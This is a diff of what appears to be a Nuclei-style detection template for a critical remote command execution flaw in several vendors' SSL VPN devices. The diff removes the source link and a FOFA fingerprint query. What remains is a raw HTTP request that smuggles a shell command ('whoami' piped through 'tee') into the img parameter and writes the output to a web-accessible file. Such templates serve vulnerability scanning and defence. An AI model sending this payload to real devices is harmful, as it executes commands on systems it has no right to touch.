@@ -3,12 +3,8 @@ info:
   name: 通杀多个安全厂商安全设备远程命令执行漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/dbpwlplxbrgwtskh'
+  description: ''
   tags: rce,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: dbpwlplxbrgwtskh
-    fofa: body="/webui/images/default/default/alert_close.jpg"
 http:
 - raw:
   - 'GET /sslvpn/sslvpn_client.php?client=logoImg&img=x%20/tmp|echo%20%60whoami%60%20|tee%20/usr/local/webui/sslvpn/check.txt|ls HTTP/1.1
